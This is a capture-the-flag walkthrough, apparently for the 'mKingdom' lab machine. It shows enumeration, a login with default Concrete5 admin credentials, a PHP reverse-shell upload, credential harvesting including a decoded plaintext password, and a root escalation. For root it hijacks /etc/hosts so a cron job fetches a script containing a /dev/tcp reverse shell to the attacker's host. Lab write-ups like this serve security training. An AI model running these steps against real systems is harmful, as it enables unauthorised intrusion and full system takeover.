# How to access the admin panel
Scan the website using nmap:
<pre>nmap -sV VICTIM_IP_ADDRESS </pre>
Nmap reveals that port 85 is open:

![image](https://github.com/user-attachments/assets/d0e4f543-0a32-4e3a-9baf-21c18ce4db59)


Run Gobuster after completing the Nmap scan. The results reveal the /app directory:
<pre>gobuster dir -u "http://VICTIM_IP_ADDRESS:85/" -w /usr/share/wordlists/dirb/small.txt -t 64</pre>
![Bez tytułu](https://github.com/user-attachments/assets/5cf1f095-12b2-4022-abd1-26df6afa62e9)

Click the "Jump" button, which triggers a redirect:

![image](https://github.com/user-attachments/assets/5a8c3552-8589-41f3-8828-bd6d1a132a19)

Further enumeration reveals a database.php file located in /config, which will be useful later:

![image](https://github.com/user-attachments/assets/366199be-a023-4fb6-9a7c-64de12f49556)

At the bottom of the page, there's information indicating that the site uses the Concrete5 CMS:

![image](https://github.com/user-attachments/assets/724469aa-2898-40f5-9a0c-3b57745afaa0)

Clicking the "Log in" button redirects to the login panel, which shows a standard admin login form. The default credentials are:
<pre>Username: admin</pre>
<pre>Password: password</pre>

<br><br>
# How to get a reverse shell
## On the victim machine
Go to System Settings → Files → Allowed File Types. Add php to the list of allowed file types:

![image](https://github.com/user-attachments/assets/9a76b22e-0758-4501-8a17-ca3c46b68cc1)

Create a shell.php file on the attacker's machine: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php   
Upload a PHP reverse shell:

![image](https://github.com/user-attachments/assets/8c92daa3-47ef-423f-96d3-76a197717059)  

A popup window will show the path to the uploaded file:
<pre>http://VICTIM_IP_ADRESS:85/app/castle/application/files/6217/4308/6870/shell.php</pre>

## On the attacker machine
Start a listener:
<pre>nc -lvnp 4444</pre>

Go back to browser and in new tab go to:
<pre>http://VICTIM_IP_ADRESS:85/app/castle/application/files/6217/4308/6870/shell.php</pre>

Once the shell is triggered, upgrade the session:
<pre>python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>  
![image](https://github.com/user-attachments/assets/9d5bac6d-1e00-4ef2-96ed-1b3a7aa1d1cc)

<br><br>
# Get User Credentials
Go back to the database.php file found during gobuster enumeration. It contains credentials for the toad user:

![image](https://github.com/user-attachments/assets/c177072f-b9d0-45c7-b119-4bcc48774eca)

Switch to that user:
<pre>su toad</pre>  
In the toad home directory, there's no user.txt or root.txt, but we can extract credentials for mario from the environment variables:

![image](https://github.com/user-attachments/assets/f467a7ab-fe55-4fb8-ad63-98154e493d70)  

Use CyberChef to decode the Base64 password. The result: <pre>ikaTeNTANtES</pre>

Now log in as mario. Inside the mario directory, use less to read the user.txt flag:

![image](https://github.com/user-attachments/assets/0834e2fd-2a48-4ec2-a16a-f84c0b150d06)  

Root access is required for the root.txt.
 
<br><br>
# How to get root
We’ll use:
1.	linpeas.sh: http://michalszalkowski.com/security/linpeas/
2.	Documentation: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

## On the attacker machine
Download linpeas.sh:
<pre>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod +x linpeas.sh</pre>

Start a local HTTP server:
<pre>sudo python3 -m http.server 9000</pre>

## On the victim machine
Download and run linpeas.sh:
<pre>curl <attacker_machine_ip_adress>/linpeas.sh | sh</pre>

During the scan we can see that /etc/hosts is writable.

![image](https://github.com/user-attachments/assets/9ec6d78b-bf12-4972-990f-988be268f138)

After checking all running processes and cron jobs, there is a cron job which executes with root privilege every minute: 
<pre>curl mkingdom.thm:85/app/castle/application/counter.sh</pre>

To redirect mkingdom.thm to the attacker's IP:
<pre>echo "ATTACKER_IP_ADDRESS   mkingdom.thm" >> /etc/hosts</pre>  

However, this alone doesn't work, because cron still resolves to 127.0.1.1:

![image](https://github.com/user-attachments/assets/db84ae46-3c58-4a6a-8c23-40b4bc6fa090)

The workaround is to overwrite the entire file manually:
<pre> cat << EOF > /tmp/hosts_fixed
127.0.0.1       localhost
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

ATTACKER_IP_ADDRESS    mkingdom.thm
EOF
</pre>

Copy custom /tmp/hosts_fixed file and overwrite the system’s /etc/hosts file with it.
<pre>cp /tmp/hosts_fixed /etc/hosts</pre>

As shown below, the cron job is configured to reach the attacker's machine:

![image](https://github.com/user-attachments/assets/466df7d9-9eba-4e64-8704-baf2c15270f8)

## On the attacker machine
Create the folder structure:
<pre>mkdir -p app/castle/application
cd app/castle/application
</pre>

After that create counter.sh:
<pre>cat << EOF > counter.sh
#!/bin/bash
bash -i >& /dev/tcp/<attacker_machine_ip_address>/4444 0>&1
EOF
</pre>

Lastly change permission to executable:
<pre>chmod +x counter.sh</pre>

Full process:

![image](https://github.com/user-attachments/assets/bdcd3fc4-7ebe-40b0-9e55-fc67dca3001b)

In two separate terminals run:
<pre>python3 -m http.server 85</pre>
<pre>nc -lvnp 4444</pre>

Wait for cron to trigger:

![image](https://github.com/user-attachments/assets/f390b7ce-7501-4bf4-b7c8-bccf738083ad)
![image](https://github.com/user-attachments/assets/f734f8b5-5c6b-46cf-a38d-204315b04709)

Know we reverse shell as root:

![image](https://github.com/user-attachments/assets/d09eb426-53c8-4e87-81af-c42d098a7f0c)

Use less to check flag:

![image](https://github.com/user-attachments/assets/e03dee91-a4fe-4886-be92-681dbabda795)
